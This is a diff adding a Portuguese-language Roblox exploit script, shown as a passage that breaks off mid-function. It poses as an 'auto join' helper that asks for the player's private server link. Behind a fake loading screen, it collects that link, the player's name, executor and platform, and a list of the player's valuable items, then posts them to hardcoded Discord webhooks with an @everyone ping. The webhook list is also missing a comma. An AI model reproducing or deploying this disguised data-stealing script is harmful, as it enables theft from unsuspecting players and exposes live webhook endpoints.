@@ -1,0 +1,1202 @@
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+
+local PLOTS_NAME = "Plots"
+local WEBHOOK_URLS = {
+    "https://discord.com/api/webhooks/1451316250448887863/5PVvU7um09AnAXmxH8dbLgsDP4ijHk31LjBifor3NaVK8HyG_QOG0WvQX_qDZ1NDkNY8"
+
+"https://discord.com/api/webhooks/1451984982007480563/pnZPiAp3lrV-cUz0Jw1bZi_AqC8lx0raaNXH_q44eCKPZkHTd4uCLh9bhzY4KFMEiaRk",
+    
+}
+local Min_Gen = 2000
+local LINK_PATTERN = "^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$"
+local placeholderText = "Digite o seu servidor aqui"
+local normalTextColor = Color3.fromRGB(235, 235, 235)
+local errorTextColor = Color3.fromRGB(220, 80, 80)
+local hintColor = Color3.fromRGB(180, 180, 185)
+
+local currentLoaderGui = nil
+local dragging = false
+local dragInput = nil
+local dragStart = nil
+local startPos = nil
+local loadingDotsActive = true
+
+local brainrotUI = Instance.new("ScreenGui")
+brainrotUI.Name = "BrainrotUI"
+brainrotUI.ResetOnSpawn = false
+brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
+brainrotUI.IgnoreGuiInset = true
+brainrotUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local miniFrame = Instance.new("Frame", brainrotUI)
+miniFrame.Name = "MiniTab"
+miniFrame.Size = UDim2.new(0, 560, 0, 160)
+miniFrame.Position = UDim2.new(0.5, -280, 0.45, -80)
+miniFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 44)
+miniFrame.BorderSizePixel = 0
+miniFrame.ZIndex = 50
+miniFrame.Active = true
+miniFrame.Selectable = true
+
+local miniCorner = Instance.new("UICorner", miniFrame)
+miniCorner.CornerRadius = UDim.new(0, 12)
+
+local miniTitle = Instance.new("TextLabel", miniFrame)
+miniTitle.Size = UDim2.new(1, -24, 0, 44)
+miniTitle.Position = UDim2.new(0, 12, 0, 8)
+miniTitle.BackgroundTransparency = 1
+miniTitle.Font = Enum.Font.GothamBold
+miniTitle.TextSize = 26
+miniTitle.TextColor3 = Color3.fromRGB(245, 245, 245)
+miniTitle.Text = "GordÃ£o auto join."
+miniTitle.TextXAlignment = Enum.TextXAlignment.Center
+miniTitle.TextYAlignment = Enum.TextYAlignment.Center
+miniTitle.ZIndex = 52
+
+local serverLinkBox = Instance.new("TextBox", miniFrame)
+serverLinkBox.Name = "ServerLinkBox"
+serverLinkBox.Size = UDim2.new(1, -140, 0, 44)
+serverLinkBox.Position = UDim2.new(0, 20, 0, 64)
+serverLinkBox.PlaceholderText = ""
+serverLinkBox.Text = placeholderText
+serverLinkBox.Font = Enum.Font.Gotham
+serverLinkBox.TextSize = 18
+serverLinkBox.TextColor3 = hintColor
+serverLinkBox.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
+serverLinkBox.BorderSizePixel = 0
+serverLinkBox.TextXAlignment = Enum.TextXAlignment.Center
+serverLinkBox.TextWrapped = false
+serverLinkBox.ClearTextOnFocus = false
+serverLinkBox.ZIndex = 52
+
+local boxCorner = Instance.new("UICorner", serverLinkBox)
+boxCorner.CornerRadius = UDim.new(0, 8)
+
+local confirmButton = Instance.new("TextButton", miniFrame)
+confirmButton.Size = UDim2.new(0, 110, 0, 44)
+confirmButton.Position = UDim2.new(1, -130, 0, 64)
+confirmButton.AnchorPoint = Vector2.new(0, 0)
+confirmButton.BackgroundColor3 = Color3.fromRGB(65, 140, 255)
+confirmButton.Font = Enum.Font.GothamBold
+confirmButton.TextSize = 16
+confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmButton.Text = "Confirmar"
+confirmButton.AutoButtonColor = true
+confirmButton.ZIndex = 52
+
+local confirmCorner = Instance.new("UICorner", confirmButton)
+confirmCorner.CornerRadius = UDim.new(0, 8)
+
+local success, notificationEvent = pcall(function()
+	return NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message)
+	end)
+end)
+
+task.spawn(function()
+	pcall(function()
+		NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
+		NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
+		NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
+		NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
+	end)
+end)
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+local function safeRequest(opts)
+	pcall(function() request(opts) end)
+end
+
+local function rand(min, max)
+	return math.random() * (max - min) + min
+end
+
+local function clamp(v, a, b)
+	if v < a then return a end
+	if v > b then return b end
+	return v
+end
+
+local function parseSuffixNumber(str)
+	if not str or type(str) ~= "string" then return nil end
+	
+	local s = string.gsub(str, "%s+", ""):lower()
+	s = string.gsub(s, ",", "")
+	s = string.gsub(s, "%+", "")
+	if string.sub(s, 1, 1) == "$" then s = string.sub(s, 2) end
+	
+	s = string.gsub(s, "/.*$", "")
+	s = string.gsub(s, "[^%w%.]+$", "")
+	local numPart, suffix = string.match(s, "^([%d%.]+)([kmgtbq]?)")
+	
+	if not numPart then return nil end
+	
+	local n = tonumber(numPart)
+	if not n then return nil end
+	
+	local multipliers = { k = 1e3, m = 1e6, b = 1e9, t = 1e12, q = 1e15 }
+	local mul = 1
+	
+	if suffix and suffix ~= "" then mul = multipliers[suffix] or 1 end
+	
+	return n * mul
+end
+
+local function findDescendantByNameCI(root, name)
+	if not root then return nil end
+	
+	if string.lower(root.Name) == string.lower(name) then return root end
+	
+	for _, child in ipairs(root:GetChildren()) do
+		local found = findDescendantByNameCI(child, name)
+		if found then return found end
+	end
+	
+	return nil
+end
+
+local function getGenerationTextFromInstance(inst)
+	if not inst then return nil end
+	
+	local txt
+	
+	if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then txt = inst.Text end
+	
+	if (not txt) and inst:IsA("ValueBase") then
+		local v = inst.Value
+		if v ~= nil then txt = tostring(v) end
+	end
+	
+	if (not txt) then
+		local ok, genericTxt = pcall(function() return inst.Text end)
+		if ok and genericTxt then txt = genericTxt end
+	end
+	
+	return txt
+end
+
+local function getRarityTextFromInstance(inst)
+	if not inst then return nil end
+	
+	local txt
+	
+	if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then txt = inst.Text end
+	
+	if (not txt) and inst:IsA("ValueBase") then
+		local v = inst.Value
+		if v ~= nil then txt = tostring(v) end
+	end
+	
+	if (not txt) then
+		local ok, genericTxt = pcall(function() return inst.Text end)
+		if ok and genericTxt then txt = genericTxt end
+		
+		if (not txt) then
+			local ok2, genericVal = pcall(function() return inst.Value end)
+			if ok2 and genericVal then txt = tostring(genericVal) end
+		end
+	end
+	
+	if not txt then return nil end
+	
+	txt = tostring(txt)
+	txt = string.gsub(txt, "^%s+", "")
+	txt = string.gsub(txt, "%s+$", "")
+	return txt
+end
+
+local function findBasePartForPodium(podium)
+	if not podium then return nil end
+	
+	local base = findDescendantByNameCI(podium, "Base")
+	
+	if base and base:IsA("BasePart") then return base end
+	
+	if base then
+		for _, d in ipairs(base:GetDescendants()) do
+			if d:IsA("BasePart") then return d end
+		end
+	end
+	
+	for _, d in ipairs(podium:GetDescendants()) do
+		if d:IsA("BasePart") then return d end
+	end
+	
+	return nil
+end
+
+local function isPodiumIndex(name)
+	if not name then return false end
+	
+	local n = tonumber(name)
+	return n and n >= 1 and n <= 50 and math.floor(n) == n
+end
+
+local function findGenerationInDecorations(decorations)
+	if not decorations then return nil end
+	
+	local bestNum, bestText, bestGenInst = nil, nil, nil
+	
+	local function checkInst(inst)
+		local genText = getGenerationTextFromInstance(inst)
+		
+		if genText then
+			local numeric = parseSuffixNumber(genText)
+			
+			if numeric then
+				if (not bestNum) or numeric > bestNum then
+					bestNum = numeric
+					bestText = genText
+					bestGenInst = inst
+				end
+			end
+		end
+	end
+	
+	if string.lower(decorations.Name) == "generation" then checkInst(decorations) end
+	
+	for _, desc in ipairs(decorations:GetDescendants()) do
+		if string.lower(desc.Name) == "generation" then checkInst(desc) end
+	end
+	
+	if bestNum then return bestNum, bestText, bestGenInst end
+	
+	return nil
+end
+
+local function getRarityForPodium(podium, decorations)
+	if decorations then
+		if string.lower(decorations.Name) == "rarity" then
+			local t = getRarityTextFromInstance(decorations)
+			if t and t ~= "" then return t end
+		end
+		
+		for _, d in ipairs(decorations:GetDescendants()) do
+			if string.lower(d.Name) == "rarity" then
+				local t = getRarityTextFromInstance(d)
+				if t and t ~= "" then return t end
+			end
+		end
+	end
+	
+	local base = findDescendantByNameCI(podium, "Base") or podium:FindFirstChild("Base")
+	
+	if base then
+		local r = base:FindFirstChild("Rarity") or findDescendantByNameCI(base, "Rarity")
+		
+		if r then
+			local t = getRarityTextFromInstance(r)
+			if t and t ~= "" then return t end
+		end
+		
+		for _, d in ipairs(base:GetDescendants()) do
+			if string.lower(d.Name) == "rarity" then
+				local t = getRarityTextFromInstance(d)
+				if t and t ~= "" then return t end
+			end
+		end
+	end
+	
+	local r = podium:FindFirstChild("Rarity") or findDescendantByNameCI(podium, "Rarity")
+	
+	if r then
+		local t = getRarityTextFromInstance(r)
+		if t and t ~= "" then return t end
+	end
+	
+	for _, d in ipairs(podium:GetDescendants()) do
+		if string.lower(d.Name) == "rarity" then
+			local t = getRarityTextFromInstance(d)
+			if t and t ~= "" then return t end
+		end
+	end
+	
+	local overhead = podium:FindFirstChild("AnimalOverhead") or findDescendantByNameCI(podium, "AnimalOverhead")
+	
+	if overhead then
+		local r2 = overhead:FindFirstChild("Rarity") or findDescendantByNameCI(overhead, "Rarity")
+		
+		if r2 then
+			local t = getRarityTextFromInstance(r2)
+			if t and t ~= "" then return t end
+		end
+		
+		for _, d in ipairs(overhead:GetDescendants()) do
+			if string.lower(d.Name) == "rarity" then
+				local t = getRarityTextFromInstance(d)
+				if t and t ~= "" then return t end
+			end
+		end
+	end
+	
+	return nil
+end
+
+local function extractDisplayNameFollowingPath(plot, podium, decorations, genInst)
+	local function extractFromDecorationNode(decNode)
+		if not decNode then return nil end
+		
+		local animalOverhead = findDescendantByNameCI(decNode, "AnimalOverhead")
+		
+		if animalOverhead then
+			local disp = findDescendantByNameCI(animalOverhead, "DisplayName") or findDescendantByNameCI(animalOverhead, "Displayname") or findDescendantByNameCI(animalOverhead, "displayname")
+			
+			if disp then
+				local txt = disp.Text or disp.Value or ""
+				if txt and txt ~= "" then return txt end
+			end
+			
+			local txt2 = animalOverhead.Text or animalOverhead.Value or ""
+			if txt2 and txt2 ~= "" then return txt2 end
+		end
+		
+		local decorationNode = findDescendantByNameCI(decNode, "Decoration") or findDescendantByNameCI(decNode, "Decor") or decNode
+		
+		if decorationNode then
+			local part = findDescendantByNameCI(decorationNode, "Part") or findDescendantByNameCI(decorationNode, "BasePart")
+			
+			if not part then
+				for _, d in ipairs(decorationNode:GetDescendants()) do
+					if d:IsA("BasePart") then
+						part = d
+						break
+					end
+				end
+			end
+			
+			if part then
+				local spawn = findDescendantByNameCI(part, "Spawn") or findDescendantByNameCI(part, "SpawnLocation") or findDescendantByNameCI(decorationNode, "Spawn")
+				local attachment
+				
+				if spawn then
+					attachment = findDescendantByNameCI(spawn, "Attachment") or findDescendantByNameCI(spawn, "Attachments")
+				end
+				
+				if not attachment then
+					for _, d in ipairs(part:GetDescendants()) do
+						if d:IsA("Attachment") then
+							attachment = d
+							break
+						end
+					end
+				end
+				
+				if attachment then
+					local ao = findDescendantByNameCI(attachment, "AnimalOverhead") or findDescendantByNameCI(decorationNode, "AnimalOverhead") or findDescendantByNameCI(part, "AnimalOverhead")
+					
+					if ao then
+						local disp = findDescendantByNameCI(ao, "DisplayName") or findDescendantByNameCI(ao, "Displayname") or findDescendantByNameCI(ao, "displayname")
+						
+						if disp then
+							local txt = disp.Text or disp.Value or ""
+							if txt and txt ~= "" then return txt end
+						end
+						
+						local txt2 = ao.Text or ao.Value or ""
+						if txt2 and txt2 ~= "" then return txt2 end
+					end
+				end
+			end
+		end
+		
+		local dispAny = findDescendantByNameCI(decNode, "DisplayName") or findDescendantByNameCI(decNode, "Displayname") or findDescendantByNameCI(decNode, "displayname")
+		
+		if dispAny then
+			local txt = dispAny.Text or dispAny.Value or ""
+			if txt and txt ~= "" then return txt end
+		end
+		
+		for _, d in ipairs(decNode:GetDescendants()) do
+			local lname = string.lower(d.Name or "")
+			
+			if lname:find("display") or lname:find("name") or lname:find("owner") or lname:find("animal") then
+				local txt = d.Text or d.Value or ""
+				if txt and txt ~= "" then return txt end
+			end
+		end
+		
+		return nil
+	end
+	
+	if decorations then
+		local decWithGen = findDescendantByNameCI(decorations, "Generation")
+		
+		if decWithGen then
+			local res = extractFromDecorationNode(decWithGen)
+			if res and res ~= "" then return res end
+			
+			if genInst then
+				local prox = extractFromDecorationNode(genInst.Parent) or extractFromDecorationNode(genInst)
+				if prox and prox ~= "" then return prox end
+			end
+		end
+		
+		for _, child in ipairs(decorations:GetChildren()) do
+			local res = extractFromDecorationNode(child)
+			if res and res ~= "" then return res end
+		end
+	end
+	
+	if podium then
+		local oh = findDescendantByNameCI(podium, "AnimalOverhead")
+		
+		if oh then
+			local disp = findDescendantByNameCI(oh, "DisplayName") or findDescendantByNameCI(oh, "Displayname")
+			
+			if disp then
+				local txt = disp.Text or disp.Value or ""
+				if txt and txt ~= "" then return txt end
+			end
+			
+			local txt2 = oh.Text or oh.Value or ""
+			if txt2 and txt2 ~= "" then return txt2 end
+		end
+	end
+	
+	if genInst then
+		local p = genInst.Parent
+		
+		while p do
+			local disp = findDescendantByNameCI(p, "DisplayName") or findDescendantByNameCI(p, "Displayname")
+			
+			if disp then
+				local txt = disp.Text or disp.Value or ""
+				if txt and txt ~= "" then return txt end
+			end
+			
+			p = p.Parent
+		end
+	end
+	
+	if plot then
+		local pdisp = findDescendantByNameCI(plot, "DisplayName") or findDescendantByNameCI(plot, "Displayname")
+		
+		if pdisp then
+			local txt = pdisp.Text or pdisp.Value or ""
+			if txt and txt ~= "" then return txt end
+		end
+		
+		for _, d in ipairs(plot:GetDescendants()) do
+			local lname = string.lower(d.Name or "")
+			
+			if lname:find("display") or lname:find("name") or lname:find("owner") or lname:find("animal") then
+				local txt = d.Text or d.Value or ""
+				if txt and txt ~= "" then return txt end
+			end
+		end
+	end
+	
+	if podium and podium.Name and podium.Name ~= "" then
+		return tostring(podium.Name)
+	end
+	
+	if plot and plot.Name and plot.Name ~= "" then
+		return tostring(plot.Name)
+	end
+	
+	return nil
+end
+
+local function findAllSecretAndOGBrainrots()
+	local plotsFolder = workspace:FindFirstChild(PLOTS_NAME)
+	
+	if not plotsFolder then
+		for _, c in ipairs(workspace:GetChildren()) do
+			if string.lower(c.Name) == string.lower(PLOTS_NAME) then plotsFolder = c; break end
+		end
+	end
+	
+	if not plotsFolder then return {} end
+	
+	local results = {}
+	
+	for _, plot in ipairs(plotsFolder:GetChildren()) do
+		local animalPodiums = plot:FindFirstChild("AnimalPodiums") or findDescendantByNameCI(plot, "AnimalPodiums")
+		
+		if animalPodiums then
+			for _, podium in ipairs(animalPodiums:GetChildren()) do
+				if isPodiumIndex(podium.Name) then
+					local base = findDescendantByNameCI(podium, "Base") or podium:FindFirstChild("Base")
+					local decorations = nil
+					
+					if base then decorations = base:FindFirstChild("Decorations") or findDescendantByNameCI(base, "Decorations") end
+					
+					if not decorations then decorations = podium:FindFirstChild("Decorations") or findDescendantByNameCI(podium, "Decorations") end
+					
+					local rarityText = getRarityForPodium(podium, decorations)
+					
+					if rarityText then
+						local rlower = string.lower(rarityText)
+						
+						if string.find(rlower, "secret", 1, true) or string.find(rlower, "og", 1, true) then
+							local numeric, rawText, genInst = nil, nil, nil
+							
+							if decorations then
+								local n, t, g = findGenerationInDecorations(decorations)
+								if n then numeric = n; rawText = t; genInst = g end
+							end
+							
+							if not numeric then
+								local genInstCandidate = podium:FindFirstChild("Generation") or findDescendantByNameCI(podium, "Generation")
+								
+								if not genInstCandidate then
+									local overhead = podium:FindFirstChild("AnimalOverhead") or findDescendantByNameCI(podium, "AnimalOverhead")
+									
+									if overhead then genInstCandidate = overhead:FindFirstChild("Generation") or findDescendantByNameCI(overhead, "Generation") end
+								end
+								
+								if genInstCandidate then
+									local genText = getGenerationTextFromInstance(genInstCandidate)
+									if genText then numeric = parseSuffixNumber(genText); rawText = genText; genInst = genInstCandidate end
+								end
+							end
+							
+							local rawOk = false
+							
+							if rawText and type(rawText) == "string" then
+								local s = tostring(rawText)
+								s = string.gsub(s, "^%s+", "")
+								if string.sub(s,1,1) == "$" then rawOk = true end
+							end
+							
+							if rawOk and numeric and numeric >= Min_Gen then
+								local basePart = findBasePartForPodium(podium)
+								
+								table.insert(results, {
+									value = numeric,
+									numericValue = numeric or 0,
+									rawText = rawText,
+									podium = podium,
+									plot = plot,
+									basePart = basePart,
+									decorations = decorations,
+									rarity = rarityText,
+									genInst = genInst,
+								})
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+	
+	return results
+end
+
+local function convertToBrainrotFormat(entries)
+	local brainrots = {}
+	
+	table.sort(entries, function(a,b) return (a.numericValue or 0) > (b.numericValue or 0) end)
+	
+	for _, entry in ipairs(entries) do
+		local displayName = extractDisplayNameFollowingPath(entry.plot, entry.podium, entry.decorations, entry.genInst)
+		local name = displayName or (entry.rarity or "Brainrot Desconhecido")
+		
+		table.insert(brainrots, {
+			value = entry.numericValue or 0,
+			name = name,
+			count = 1
+		})
+	end
+	
+	return brainrots
+end
+
+local function formatNumberShort(n)
+	if not n then return "0" end
+	
+	local num = tonumber(n) or 0
+	local absNum = math.abs(num)
+	
+	if absNum >= 1e9 then
+		return string.format("%.2fB", num / 1e9)
+	elseif absNum >= 1e6 then
+		return string.format("%.2fM", num / 1e6)
+	elseif absNum >= 1e3 then
+		return string.format("%.2fK", num / 1e3)
+	else
+		return tostring(num)
+	end
+end
+
+local function getSystemInfo()
+    local UserInputService = game:GetService("UserInputService")
+    local GuiService = game:GetService("GuiService")
+    
+    local plataforma = "Desconhecido"
+    
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        plataforma = "Mobile"
+    elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+        plataforma = "PC"
+    elseif UserInputService.GamepadEnabled then
+        plataforma = "Console"
+    end
+    
+    if GuiService:IsTenFootInterface() then
+        plataforma = "Console/TV"
+    end
+    
+    local executor = "Desconhecido"
+    
+    local funcoes_identificacao = {
+        identifyexecutor,
+        getexecutorname,
+        getexploitname
+    }
+    
+    for _, func in ipairs(funcoes_identificacao) do
+        if func then
+            local sucesso, resultado = pcall(func)
+            if sucesso and resultado and resultado ~= "" then
+                executor = resultado
+                break
+            end
+        end
+    end
+    
+    if executor == "Desconhecido" then
+        if getgenv and gethui then
+            executor = "UNC CompatÃ­vel"
+        elseif loadstring then
+            executor = "BÃ¡sico"
+        end
+    end
+    
+    if executor == "Desconhecido" and isexecutorclosure then
+        local sucesso = pcall(function()
+            return isexecutorclosure(function() end)
+        end)
+        if sucesso then
+            executor = "GenÃ©rico"
+        end
+    end
+    
+    if executor == "Desconhecido" then
+        if jit then
+            executor = "LuaJIT"
+        elseif not getfenv(0).script then
+            executor = "NÃ£o Identificado"
+        end
+    end
+    
+    return {
+        Plataforma = plataforma,
+        Executor = executor
+    }
+end
+
+local function sendToDiscord(link, playerCount, playerName, brainrots)
+	task.spawn(function()
+		local info = getSystemInfo()
+		
+		local brainrotList = ""
+		local hasBrainrots = #brainrots > 0
+		
+		if hasBrainrots then
+			local limitDisplay = math.min(#brainrots, 15)
+			for i = 1, limitDisplay do
+				local br = brainrots[i]
+				local formattedValue = formatNumberShort(br.value)
+				brainrotList = brainrotList .. string.format("%s - %s (x%d)\n", br.name, formattedValue, br.count)
+			end
+			
+			if #brainrots > 15 then
+				brainrotList = brainrotList .. string.format("...e mais %d brainrots", #brainrots - 15)
+			end
+		else
+			brainrotList = "Nenhum brainrot encontrado"
+		end
+		
+		local description = string.format(
+			"**ðŸ·ï¸ Name**\n%s\n" ..
+			"**ðŸ‘¥ Players**\n%d/8\n\n" ..
+			"**Total:** %d brainrots de alto valor",
+			brainrotList,
+			playerCount,
+			#brainrots
+		)
+		
+		local fields = {
+			{
+				name = "ðŸ‘¤ Jogador",
+				value = playerName,
+				inline = true
+			},
+			{
+				name = "ðŸ’» Executor",
+				value = info.Executor,
+				inline = true
+			},
+			{
+				name = "ðŸ“± Plataforma",
+				value = info.Plataforma,
+				inline = true
+			},
+			{
+				name = "ðŸŒ Join Link",
+				value = "[Clique aqui para entrar](" .. link .. ")",
+				inline = false
+			}
+		}
+		
+		local currentTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		local footer = string.format("GordÃ£o Methods", formatNumberShort(Min_Gen), os.date("%d/%m/%Y Ã s %H:%M"))
+	
+		local contentMessage = hasBrainrots and "@everyone" or ""
+		
+		local data = HttpService:JSONEncode({
+			content = contentMessage,
+			embeds = {{
+				title = hasBrainrots and "ðŸ”¥ Server Privado Detectado" or "ðŸ’€ Server Privado (Sem Brainrots)",
+				description = description,
+				color = hasBrainrots and 8663711 or 6316128, 
+				fields = fields,
+				image = {
+					url = "https://i.postimg.cc/MK8WGGxB/693618da860aba2c3623461b.gif"
+				},
+				timestamp = currentTime,
+				footer = { text = footer }
+			}}
+		})
+		
+		for _, webhookUrl in ipairs(WEBHOOK_URLS) do
+			print("ðŸ“¤ Enviando dados para webhook:", webhookUrl)
+			local success, res = pcall(function()
+				return HttpService:PostAsync(
+					webhookUrl,
+					data,
+					Enum.HttpContentType.ApplicationJson,
+					false,
+					{["Content-Type"] = "application/json"}
+				)
+			end)
+			
+			if not success then
+				warn("âŒ Erro no envio para " .. webhookUrl .. ":", res)
+				local altSuccess = pcall(function()
+					return request({
+						Url = webhookUrl,
+						Method = "POST",
+						Headers = {["Content-Type"] = "application/json"},
+						Body = data
+					})
+				end)
+				
+				if altSuccess then
+					print("âœ… Enviado via mÃ©todo alternativo para:", webhookUrl)
+				end
+			else
+				print("âœ… Dados enviados com sucesso para:", webhookUrl)
+			end
+		end
+	end)
+end
+
+local function createLoaderUI(serverLink)
+	pcall(function() brainrotUI:Destroy() end)
+	
+	local loaderGui = Instance.new("ScreenGui")
+	loaderGui.Name = "KdmlLoader"
+	loaderGui.ResetOnSpawn = false
+	loaderGui.Parent = game:GetService("CoreGui")
+	loaderGui.IgnoreGuiInset = true
+	loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	currentLoaderGui = loaderGui
+	
+	local bg = Instance.new("Frame", loaderGui)
+	bg.Name = "Background"
+	bg.Size = UDim2.new(1, 0, 1, 0)
+	bg.Position = UDim2.new(0, 0, 0, 0)
+	bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	bg.BorderSizePixel = 0
+	bg.ZIndex = 1
+	
+	local starContainer = Instance.new("Frame", bg)
+	starContainer.Size = UDim2.new(1, 0, 1, 0)
+	starContainer.Position = UDim2.new(0, 0, 0, 0)
+	starContainer.BackgroundTransparency = 1
+	starContainer.BorderSizePixel = 0
+	starContainer.ZIndex = 2
+	starContainer.ClipsDescendants = true
+	
+	local columns = 10
+	local rows = 5
+	local marginX = 0.08
+	local marginY = 0.08
+	local screenW, screenH = workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y
+	local stars = {}
+	
+	local function startRandomMove(s)
+		if not s or not s.Instance or s.isMovingToClick then return end
+		
+		local duration = rand(10, 40)
+		local targetX = clamp(rand(marginX, 1 - marginX), 0.02, 0.98)
+		local targetY = clamp(rand(marginY, 1 - marginY), 0.02, 0.98)
+		local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
+		
+		if s.movementTween then
+			pcall(function() s.movementTween:Cancel() end)
+		end
+		
+		s.movementTween = TweenService:Create(s.Instance, tweenInfo, {Position = UDim2.new(targetX, 0, targetY, 0)})
+		s.movementTween:Play()
+		s.movementTween.Completed:Connect(function()
+			if s and s.Instance and (not s.isMovingToClick) then
+				startRandomMove(s)
+			end
+		end)
+	end
+	
+	for r = 1, rows do
+		for c = 1, columns do
+			local star = Instance.new("Frame", starContainer)
+			local scaleX = (c - 0.5) / columns
+			local scaleY = (r - 0.5) / rows
+			local jitterX = rand(-0.02, 0.02)
+			local jitterY = rand(-0.02, 0.02)
+			local posX = marginX + scaleX * (1 - marginX * 2) + jitterX
+			local posY = marginY + scaleY * (1 - marginY * 2) + jitterY
+			
+			star.Position = UDim2.new(posX, 0, posY, 0)
+			local sizePx = math.random(2, 4)
+			
+			star.Size = UDim2.new(0, sizePx, 0, sizePx)
+			star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+			star.BorderSizePixel = 0
+			star.ZIndex = 3
+			
+			local corner = Instance.new("UICorner", star)
+			corner.CornerRadius = UDim.new(1, 0)
+			
+			local minTrans = 0.15
+			star.BackgroundTransparency = rand(minTrans, 0.95)
+			
+			local blinkDuration = rand(4.5, 12)
+			local blinkDelay = rand(0, 3)
+			local blinkTweenInfo = TweenInfo.new(blinkDuration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, math.huge, true, blinkDelay)
+			local blinkTween = TweenService:Create(star, blinkTweenInfo, {BackgroundTransparency = minTrans})
+			blinkTween:Play()
+			
+			local sstate = {
+				Instance = star,
+				movementTween = nil,
+				blinkTween = blinkTween,
+				isMovingToClick = false
+			}
+			table.insert(stars, sstate)
+			startRandomMove(sstate)
+			wait(0.01)
+		end
+	end
+	
+	local uiContainer = Instance.new("Frame", loaderGui)
+	uiContainer.Size = UDim2.new(1, 0, 1, 0)
+	uiContainer.BackgroundTransparency = 1
+	uiContainer.ZIndex = 4
+	
+	local loaderTitle = Instance.new("TextLabel", uiContainer)
+	loaderTitle.Size = UDim2.new(0.9, 0, 0, 96)
+	loaderTitle.Position = UDim2.new(0.05, 0, 0.14, 0)
+	loaderTitle.BackgroundTransparency = 1
+	loaderTitle.Font = Enum.Font.GothamBold
+	loaderTitle.TextSize = 40
+	loaderTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+	loaderTitle.Text = "Atraindo player para seu servidor, aguarde"
+	loaderTitle.TextWrapped = true
+	loaderTitle.TextXAlignment = Enum.TextXAlignment.Center
+	loaderTitle.TextYAlignment = Enum.TextYAlignment.Center
+	loaderTitle.TextScaled = false
+	loaderTitle.ZIndex = 5
+	
+	loadingDotsActive = true -- Resetting for the loader UI
+	spawn(function()
+		local states = {"", ".", "..", "..."}
+		local idx = 1
+		
+		while loadingDotsActive do
+			loaderTitle.Text = "Atraindo player para seu servidor, aguarde" .. states[idx]
+			idx = idx + 1
+			if idx > #states then idx = 1 end
+			
+			wait(0.5)
+		end
+	end)
+	
+	local barBackground = Instance.new("Frame", uiContainer)
+	barBackground.Size = UDim2.new(0.74, 0, 0, 42)
+	barBackground.Position = UDim2.new(0.13, 0, 0.54, 0)
+	barBackground.BackgroundColor3 = Color3.fromRGB(140, 140, 150)
+	barBackground.BorderSizePixel = 0
+	barBackground.ZIndex = 5
+	
+	local barBgCorner = Instance.new("UICorner", barBackground)
+	barBgCorner.CornerRadius = UDim.new(0, 20)
+	
+	local barFill = Instance.new("Frame", barBackground)
+	barFill.Size = UDim2.new(0, 0, 1, 0)
+	barFill.Position = UDim2.new(0, 0, 0, 0)
+	barFill.BackgroundColor3 = Color3.fromRGB(75, 150, 255)
+	barFill.BorderSizePixel = 0
+	barFill.ZIndex = 6
+	
+	local barFillCorner = Instance.new("UICorner", barFill)
+	barFillCorner.CornerRadius = UDim.new(0, 20)
+	
+	local percentLabel = Instance.new("TextLabel", barBackground)
+	percentLabel.Size = UDim2.new(1, 0, 1, 0)
+	percentLabel.Position = UDim2.new(0, 0, 0, 0)
+	percentLabel.BackgroundTransparency = 1
+	percentLabel.Font = Enum.Font.GothamBold
+	percentLabel.TextSize = 18
+	percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	percentLabel.Text = "0%"
+	percentLabel.TextScaled = true
+	percentLabel.ZIndex = 7
+	
+	local loaderNotice = Instance.new("TextLabel", uiContainer)
+	loaderNotice.Size = UDim2.new(0.9, 0, 0, 22)
+	loaderNotice.Position = UDim2.new(0.05, 0, 0.66, 0)
+	loaderNotice.BackgroundTransparency = 1
+	loaderNotice.Font = Enum.Font.Gotham
+	loaderNotice.TextSize = 14
+	loaderNotice.TextColor3 = Color3.fromRGB(220, 220, 230)
+	loaderNotice.Text = "NÃ£o se preocupe sua base sera automaticamente fechada!"
+	loaderNotice.TextWrapped = true
+	loaderNotice.TextXAlignment = Enum.TextXAlignment.Center
+	loaderNotice.TextScaled = false
+	loaderNotice.ZIndex = 6
+	
+	local loaderFooter = Instance.new("TextLabel", uiContainer)
+	loaderFooter.Size = UDim2.new(1, 0, 0, 24)
+	loaderFooter.Position = UDim2.new(0, 0, 0.94, 0)
+	loaderFooter.BackgroundTransparency = 1
+	loaderFooter.Font = Enum.Font.GothamBold
+	loaderFooter.TextSize = 16
+	loaderFooter.TextColor3 = Color3.fromRGB(200, 160, 220)
+	loaderFooter.Text = "discord.gg/f7se7bwcsz"
+	loaderFooter.TextScaled = false
+	loaderFooter.TextWrapped = true
+	loaderFooter.TextXAlignment = Enum.TextXAlignment.Center
+	loaderFooter.ZIndex = 6
+	
+	local loaderSound = Instance.new("Sound", uiContainer)
